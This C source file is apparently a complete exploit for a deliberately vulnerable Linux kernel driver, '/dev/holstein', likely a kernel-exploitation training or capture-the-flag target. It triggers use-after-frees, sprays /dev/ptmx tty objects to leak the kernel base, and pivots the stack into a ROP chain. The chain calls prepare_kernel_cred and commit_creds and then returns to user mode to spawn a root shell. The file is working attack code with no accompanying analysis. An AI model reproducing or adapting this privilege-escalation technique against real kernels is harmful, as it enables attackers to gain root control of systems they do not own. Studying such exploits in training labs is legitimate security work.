#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

typedef uint64_t u64;

#define BUFFER_SIZE 0x400

#define info(fmt, ...) \
  fprintf(stderr, "[+] "fmt"\n", ##__VA_ARGS__)

#define IS_PRINTABLE(c) (((c) > 31) && ((c) < 127))

void hexdump(void *buffer, size_t size) {
  unsigned char *data = buffer;
  size_t j;
  for (size_t i = 0; i < size; i++) {
    printf("%02x ", data[i]);
    if (((i % 16) == 15) || (i == size - 1)) {
      printf(" |");
      for (j = (i - (i % 16)); j <= i; j++) printf("%c", IS_PRINTABLE(data[j]) ? data[j] : '.');
      printf("|\n"); 
    } 
  }
}

typedef struct fake_tty {
  int magic;    //  0
  int kref;     //  4
  void *dev;    //  8 
  void *driver; // 16
  void *ops;    // 24    
} tty;

int open_dev() {
  int fd = open("/dev/holstein", O_RDWR);
  if (fd < 0) {
    perror("open dev");
    exit(1);
  }

  return fd;
}

int fds[70];

void spray() {
  for (size_t i = 0; i < 70; ++i) {
    fds[i] = open("/dev/ptmx", O_RDWR);
    if (fds[i] < 0) {
      perror("open spray");
      exit(1);
    }
  }
}

void dump(void *ptr, size_t len) {
  u64 *data = (u64*)ptr;
  
  for (size_t i = 0; i < len; i++) {
    printf("[%zu] 0x%lx\n", i, data[i]);  
  }
}

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

u64 user_ss, user_sp, user_cs, user_rflags;

void save_state() {
  __asm__ (
    ".intel_syntax noprefix;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "mov user_cs, cs;"
    "pushf;"
    "pop user_rflags;"
    ".att_syntax;"
  );  
  info("state saved");
}

void win() {
  char *argv[] = {"/bin/sh", NULL};
  char *envp[] = {NULL};
  printf("win!\n");
  execve("/bin/sh", argv, envp);
}

int main(void) {
  save_state();

  int rc;

  unsigned char *buf = malloc(0x400);
  u64 *qbuf = (u64*)buf;

  // FIRST USE AFTER FREE
  int fd2 = open_dev();
  int fd = open_dev();
  close(fd2);
    
  spray();
  
  rc = read(fd, buf, 0x400);
  if (rc < 0)
    fatal("read");

  tty *leaked_tty = (tty*)buf;
  u64 kbase = (u64)leaked_tty->ops - 0xc39c60;
  
  info("tty_ops_leak: 0x%lx", (u64)leaked_tty->ops);
  info("kbase: 0x%lx", kbase);

  // SECOND USE AFTER FREE
  int fd0 = open_dev();
  fd = open_dev();
  close(fd0);
  
  memset(buf, 0x41, 8);
  
  spray();
  write(fd, buf, 8);

  rc = read(fd, buf, 0x400);
  if (rc < 0)
    fatal("read");
  
  u64 rop_base = qbuf[7] - 0x38;
  info("rop buffer base: 0x%lx", rop_base);

  // writes 120 bytes
  for (size_t i = 0; i < 15; i++) {
    qbuf[i] = 0xffffffffdead0000 + (i << 8);
  }

  qbuf[12] = kbase + 0x14fbea; // push rdx ; xor eax, 0x415b004f ; pop rsp ; pop rbp ; ret

  qbuf += 15; // skip fake tty operations and place the ropchain

  int i = 0;
  qbuf[i++] = 0xdeadbeefcafebabe; // dummy value for pop rbp

  /* begin rop chain to priv esc */

  // a = prepare_kernel_cred(NULL)
  qbuf[i++] = kbase + 0x14078a; // pop rdi ; ret
  qbuf[i++] = 0x00;
  qbuf[i++] = kbase + 0x72560; // prepare_kernel_cred

  // commit_creds(a)
  qbuf[i++] = kbase + 0xeb7e4; // pop rcx ; ret;
  qbuf[i++] = 0x00;
  qbuf[i++] = kbase + 0x638e9b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
  qbuf[i++] = kbase + 0x723c0; // commit_creds

  // return to usermode
  qbuf[i++] = kbase + 0x800e10+0x16; // swapgs_restore_regs_and_return_to_usermode (we skip the initial instructions and execute directly mov rdi, rsp)

  qbuf[i++] = 0xdeadbeef;
  qbuf[i++] = 0xdeadbeef;
  qbuf[i++] = (u64)win;
  qbuf[i++] = user_cs;
  qbuf[i++] = user_rflags;
  qbuf[i++] = user_sp;
  qbuf[i++] = user_ss;

  write(fd, buf, 0x400);
  
  fd2 = open_dev();
  fd = open_dev();
  close(fd2);
    
  spray();
  
  rc = read(fd, buf, 0x400);
  if (rc < 0)
    fatal("read");

  info("tty_ops_leak: 0x%lx", (u64)leaked_tty->ops);
  info("kbase: 0x%lx", kbase);

  leaked_tty->ops = (u64*)rop_base; // stack pivot so that SP = rop_base

  write(fd, buf, 0x400);

  for (size_t i = 0; i < 70; ++i) {
    info("%zu", i);
    ioctl(fds[i], 0xdeadbeef, rop_base + 15*8);
  }
  
  return 0;
}
